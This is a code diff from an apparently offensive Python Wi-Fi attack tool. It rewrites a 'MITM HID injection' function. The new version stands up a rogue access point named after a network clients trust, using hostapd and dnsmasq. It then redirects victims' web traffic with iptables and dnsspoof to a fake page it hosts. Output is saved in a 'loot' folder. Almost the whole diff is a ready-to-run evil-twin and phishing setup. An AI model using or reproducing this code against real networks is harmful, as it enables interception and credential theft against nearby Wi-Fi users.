@@ -238,21 +238,50 @@ log-dhcp
         f.write("10.0.0.1 *\n")
     os.system(f"sudo dnsspoof -i {iface} -f loot/dnsspoof_hosts &")
 
-
 def mitm_hid_injection():
     print("🧠 Starting MITM HID Injection Mode...")
-    iface = input("💜 Enter monitor mode interface (e.g. wlan0mon): ").strip()
+    iface = input("💜 Enter interface (e.g. wlan0): ").strip()
     ssid = input("💜 SSID clients think they’re connecting to: ").strip()
-    fake = input("💜 Broadcast name that will appear: ").strip()
+
     os.makedirs("loot", exist_ok=True)
 
-    print(f"📶 Broadcasting fake AP: {fake}")
-    beacon = RadioTap()/Dot11(
-        addr1="ff:ff:ff:ff:ff:ff",
-        addr2=RandMAC(), addr3=RandMAC()
-    )/Dot11Beacon()/Dot11Elt(ID=0, info=fake)
+    print("🧹 Cleaning up old services...")
+    os.system("sudo pkill -f hostapd")
+    os.system("sudo pkill -f dnsmasq")
+    os.system("sudo pkill -f phish_server.py")
+    os.system("sudo pkill -f dnsspoof")
 
-    Thread(target=lambda: sendp(beacon, iface=iface, inter=0.05, loop=1, verbose=0), daemon=True).start()
+    print("🌐 Configuring interface...")
+    os.system(f"sudo ip link set {iface} down")
+    os.system(f"sudo ip addr flush dev {iface}")
+    os.system(f"sudo ip addr add 10.0.0.1/24 dev {iface}")
+    os.system(f"sudo ip link set {iface} up")
+
+    hostapd_conf = f"""
+interface={iface}
+driver=nl80211
+ssid={ssid}
+hw_mode=g
+channel=6
+auth_algs=1
+ignore_broadcast_ssid=0
+    """.strip()
+
+    with open("loot/hostapd.conf", "w") as f:
+        f.write(hostapd_conf)
+
+    dnsmasq_conf = f"""
+interface={iface}
+dhcp-range=10.0.0.10,10.0.0.100,12h
+dhcp-option=3,10.0.0.1
+dhcp-option=6,10.0.0.1
+server=8.8.8.8
+log-queries
+log-dhcp
+    """.strip()
+
+    with open("loot/dnsmasq.conf", "w") as f:
+        f.write(dnsmasq_conf)
 
     html = f"""<html><body>
     <h2>Welcome to {ssid}</h2>
@@ -276,14 +305,29 @@ def mitm_hid_injection():
     with open("loot/injection.html", "w") as f:
         f.write(html)
 
-    print("💻 Hosting fake page at http://0.0.0.0:8080")
-    os.chdir("loot")
-    server = HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler)
-    try:
-        server.serve_forever()
-    except KeyboardInterrupt:
-        print("🛑 MITM HID server stopped.")
-        server.server_close()
+    print("📶 Launching hostapd...")
+    os.system(f"sudo hostapd loot/hostapd.conf &")
+    time.sleep(2)
+
+    print("🧠 Starting dnsmasq...")
+    os.system(f"sudo dnsmasq -C loot/dnsmasq.conf &")
+
+    print("💻 Hosting fake HID page at http://10.0.0.1 ...")
+    os.system("sudo python3 -m http.server 80 --directory loot &")
+
+    print("🔀 Redirecting traffic...")
+    os.system("sudo iptables -t nat -F")
+    os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
+    os.system("sudo iptables -t nat -A POSTROUTING -j MASQUERADE")
+
+    print("🎯 Launching dnsspoof...")
+    with open("loot/dnsspoof_hosts", "w") as f:
+        f.write("10.0.0.1 *\n")
+    os.system(f"sudo dnsspoof -i {iface} -f loot/dnsspoof_hosts &")
+
+    print("✅ MITM HID Injection is live!")
+
+
 def main():
     print_banner()
     while True:
